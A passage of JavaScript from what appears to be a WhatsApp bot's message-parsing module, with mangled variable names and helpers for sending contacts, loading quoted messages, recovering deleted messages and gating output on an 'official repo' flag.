   '\nEND:VCARD'
  return Xproto.sendMessage(
   message.chat,
   {
    contacts: {
     displayName: _0x716863,
     contacts: [
      {
       vcard: _0x586840,
      },
     ],
    },
   },
   {
    quoted: message,
    messageId: Xproto.messageId(),
   }
  )
 }
 message.loadMessage = async (_0x143141 = message.key) => {
  if (!_0x143141) {
   return false
  }
  let _0x5e265c = await client.loadMessage(message.chat, _0x143141.id, Xproto)
  return await exports.smsg(Xproto, _0x5e265c, client, false)
 }
 if (message.mtype == 'protocolMessage' && message.msg.type === 'REVOKE') {
  message.getDeleted = async () => {
   let _0x192e7d = await client.loadMessage(message.chat, message.msg.key.id, Xproto)
   return await exports.smsg(Xproto, _0x192e7d, client, false)
  }
 }
 message.reply_message = message.quoted
 message.bot = isOfficial ? Xproto : {}
 if (global.OfficialRepo && global.OfficialRepo === 'yes') {
  return message
 } else {
  return {}
 }
}
module.exports = {
 pollsg,
 callsg,
 groupsg,
 smsg,
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
 console.log('Update ' + __filename)
})
